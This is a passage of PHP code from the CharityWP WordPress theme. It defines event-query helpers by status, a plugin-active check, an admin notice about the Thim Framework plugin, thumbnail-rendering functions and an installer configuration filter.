		<a id='back-to-top' class="scrollup show" title="<?php esc_attr_e( 'Go To Top', 'charitywp' ); ?>"></a>
	<?php }
}

/**
 * Check a plugin active
 *
 * @param $plugin_dir
 * @param $plugin_file
 *
 * @return bool
 */
function thim_plugin_active( $plugin_dir, $plugin_file = null ) {
	$plugin_file            = $plugin_file ? $plugin_file : ( $plugin_dir . '.php' );
	$plugin                 = $plugin_dir . '/' . $plugin_file;
	$active_plugins_network = get_site_option( 'active_sitewide_plugins' );

	if ( isset( $active_plugins_network[$plugin] ) ) {
		return true;
	}

	$active_plugins = get_option( 'active_plugins' );

	if ( in_array( $plugin, $active_plugins ) ) {
		return true;
	}

	return false;
}

//Filter post_status tp_event
if ( !function_exists( 'thim_get_upcoming_events' ) ) {
	function thim_get_upcoming_events( $args = array() ) {
		if ( is_tax( 'tp_event_category' ) ) {
			if ( version_compare( WPEMS_VER, '2.1.5', '>=' ) ) {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'  => 'tp_event',
						'meta_query' => array(
							array(
								'key'     => 'tp_event_status',
								'value'   => 'upcoming',
								'compare' => '=',
							),
						),
						'tax_query'  => array(
							array(
								'taxonomy' => 'tp_event_category',
								'field'    => 'slug',
								'terms'    => get_query_var( 'term' ),
							)
						),
					)
				);
			} else {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'   => 'tp_event',
						'post_status' => 'tp-event-upcoming',
						'tax_query'   => array(
							array(
								'taxonomy' => 'tp_event_category',
								'field'    => 'slug',
								'terms'    => get_query_var( 'term' ),
							)
						),
					)
				);
			}
		} else {
			if ( version_compare( WPEMS_VER, '2.1.5', '>=' ) ) {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'  => 'tp_event',
						'meta_query' => array(
							array(
								'key'     => 'tp_event_status',
								'value'   => 'upcoming',
								'compare' => '=',
							),
						),
					)
				);
			} else {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'   => 'tp_event',
						'post_status' => 'tp-event-upcoming',
					)
				);
			}
		}


		return new WP_Query( $args );
	}
}

if ( !function_exists( 'thim_get_expired_events' ) ) {
	function thim_get_expired_events( $args = array() ) {
		if ( is_tax( 'tp_event_category' ) ) {
			if ( version_compare( WPEMS_VER, '2.1.5', '>=' ) ) {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'  => 'tp_event',
						'meta_query' => array(
							array(
								'key'     => 'tp_event_status',
								'value'   => 'expired',
								'compare' => '=',
							),
						),
						'tax_query'  => array(
							array(
								'taxonomy' => 'tp_event_category',
								'field'    => 'slug',
								'terms'    => get_query_var( 'term' ),
							)
						),
					)
				);
			} else {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'   => 'tp_event',
						'post_status' => 'tp-event-expired',
						'tax_query'   => array(
							array(
								'taxonomy' => 'tp_event_category',
								'field'    => 'slug',
								'terms'    => get_query_var( 'term' ),
							)
						),
					)
				);
			}
		} else {
			if ( version_compare( WPEMS_VER, '2.1.5', '>=' ) ) {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'  => 'tp_event',
						'meta_query' => array(
							array(
								'key'     => 'tp_event_status',
								'value'   => 'expired',
								'compare' => '=',
							),
						),
					)
				);
			} else {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'   => 'tp_event',
						'post_status' => 'tp-event-expired',
					)
				);
			}
		}

		return new WP_Query( $args );
	}
}

if ( !function_exists( 'thim_get_happening_events' ) ) {
	function thim_get_happening_events( $args = array() ) {
		if ( is_tax( 'tp_event_category' ) ) {
			if ( version_compare( WPEMS_VER, '2.1.5', '>=' ) ) {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'  => 'tp_event',
						'meta_query' => array(
							array(
								'key'     => 'tp_event_status',
								'value'   => 'happening',
								'compare' => '=',
							),
						),
						'tax_query'  => array(
							array(
								'taxonomy' => 'tp_event_category',
								'field'    => 'slug',
								'terms'    => get_query_var( 'term' ),
							)
						),
					)
				);
			} else {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'   => 'tp_event',
						'post_status' => 'tp-event-happenning',
						'tax_query'   => array(
							array(
								'taxonomy' => 'tp_event_category',
								'field'    => 'slug',
								'terms'    => get_query_var( 'term' ),
							)
						),
					)
				);
			}
		} else {
			if ( version_compare( WPEMS_VER, '2.1.5', '>=' ) ) {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'  => 'tp_event',
						'meta_query' => array(
							array(
								'key'     => 'tp_event_status',
								'value'   => 'happening',
								'compare' => '=',
							),
						),
					)
				);
			} else {
				$args = wp_parse_args(
					$args,
					array(
						'post_type'   => 'tp_event',
						'post_status' => 'tp-event-happenning',
					)
				);
			}
		}

		return new WP_Query( $args );
	}
}

/**
 * Hook get template archive event
 */
if ( !function_exists( 'thim_archive_event_template' ) ) {
	function thim_archive_event_template( $template ) {
		if ( get_post_type() == 'tp_event' && is_post_type_archive( 'tp_event' ) || is_tax( 'tp_event_category' ) ) {
			$GLOBALS['thim_happening_events'] = thim_get_happening_events();
			$GLOBALS['thim_upcoming_events']  = thim_get_upcoming_events();
			$GLOBALS['thim_expired_events']   = thim_get_expired_events();
		}

		return $template;
	}
}
add_action( 'template_include', 'thim_archive_event_template' );

/**
 * Waring do not re-activate Thim Framework.
 */
function thim_notify_do_not_re_active_thim_framework() {
	if ( class_exists( 'Thim_Notification' ) ) {
		$detect_upgraded = get_option( 'thim_auto_updated_theme_mods_30', false );

		if ( !$detect_upgraded ) {
			return;
		}

		$link_delete = network_admin_url( 'plugins.php?plugin_status=inactive' );

		Thim_Notification::add_notification(
			array(
				'id'          => 'do_not_support_thim_framework',
				'type'        => 'warning',
				'content'     => sprintf( __( 'Thim Core plugin is the newest upgrade version of Thim Framework. <strong>Do not re-activate Thim Framework and <a href="%s" title="Delete Thim Framework plugin">better delete this plugin</a></strong>.', 'charitywp' ), $link_delete ),
				'dismissible' => true,
				'global'      => true,
			)
		);
	}
}

add_action( 'admin_init', 'thim_notify_do_not_re_active_thim_framework' );

/**
 * @param $id
 * @param $size
 *
 * @return string
 */
function thim_thumbnail_no_loaded( $id, $size ) {
	$thumbnail_size = explode( 'x', $size );
	$width          = 0;
	$height         = 0;
	$src            = wp_get_attachment_image_src( get_post_thumbnail_id( $id ), 'full' );
	$img_src        = $src[0];

	if ( $img_src ) {
		if ( !isset( $thumbnail_size[1] ) ) {
			$thumbnail_size[1] = null;
		}

		if ( $size != 'full' && !in_array( $size, get_intermediate_image_sizes() ) ) {
			$width  = $thumbnail_size[0];
			$height = $thumbnail_size[1];

			$img_src = thim_aq_resize( $src[0], $width, $height, true );

		} else {
			if ( $size == 'full' ) {
				$img_src = $src[0];
			} else {
				$image_size = wp_get_attachment_image_src( get_post_thumbnail_id( $id ), $size );
				$width      = $image_size[1];
				$height     = $image_size[2];
			}
		}

		return '<img ' . image_hwstring( $width, $height ) . ' src="' . esc_attr( $img_src ) . '" alt="' . get_the_title( $id ) . '">';
	}
}

/**
 * aq_resize function fake.
 * Aq_Resize
 */
if ( !class_exists( 'Aq_Resize' ) ) {
	function thim_aq_resize( $url, $width = null, $height = null, $crop = null, $single = true, $upscale = false ) {
		return $url;
	}
}

/**
 * @param $id
 * @param $size
 * @param $type : default is post
 *
 * @return string
 */
if ( !function_exists( 'thim_get_thumbnail' ) ) {
	function thim_get_thumbnail( $id, $size = 'thumbnail', $type = 'post', $link = true, $classes = '' ) {
		$width         = 0;
		$height        = 0;
		$attachment_id = $id;

		if ( $type === 'post' ) {
			$attachment_id = get_post_thumbnail_id( $id );
		}
		$src = wp_get_attachment_image_src( $attachment_id, 'full' );

		if ( $size != 'full' && !in_array( $size, get_intermediate_image_sizes() ) ) {
			//custom size
			$thumbnail_size = explode( 'x', $size );
			$width          = $thumbnail_size[0];
			$height         = $thumbnail_size[1];
			$img_src        = thim_aq_resize( $src[0], $width, $height, true );
		} else {
			if ( $size == 'full' ) {
				$img_src = $src[0];
				$width   = $src[1];
				$height  = $src[2];
			} else {
				$image_size = wp_get_attachment_image_src( $attachment_id, $size );
				$width      = $image_size[1];
				$height     = $image_size[2];
			}
		}

		if ( empty( $img_src ) ) {
			$img_src = $src[0];
		}

		$html = '';
		if ( $link ) {
			$html .= '<a href="' . esc_url( get_permalink( $id ) ) . '" class="img-link" target="_self">';
		}
		$html .= '<img ' . image_hwstring( $width, $height ) . ' src="' . esc_attr( $img_src ) . '" alt="' . get_the_title( $id ) . '" class="' . $classes . '">';
		if ( $link ) {
			$html .= '</a>';
		}

		return $html;
	}
}

/**
 * @param      $id
 * @param      $size
 */
if ( !function_exists( 'thim_thumbnail' ) ) {
	function thim_thumbnail( $id, $size, $type = 'post', $link = true, $classes = '' ) {
		echo thim_get_thumbnail( $id, $size, $type, $link, $classes );
	}
}

add_filter( 'thim_core_installer_theme_config', function () {
	return array(
		'name'          => __( 'CharityWP', 'charitywp' ),
		'slug'          => 'charitywp',
		'support_link'  => 'https://thimpress.com',
		'installer_uri' => get_template_directory_uri() . '/inc/admin/installer'//Installer directory URI
	);
} );



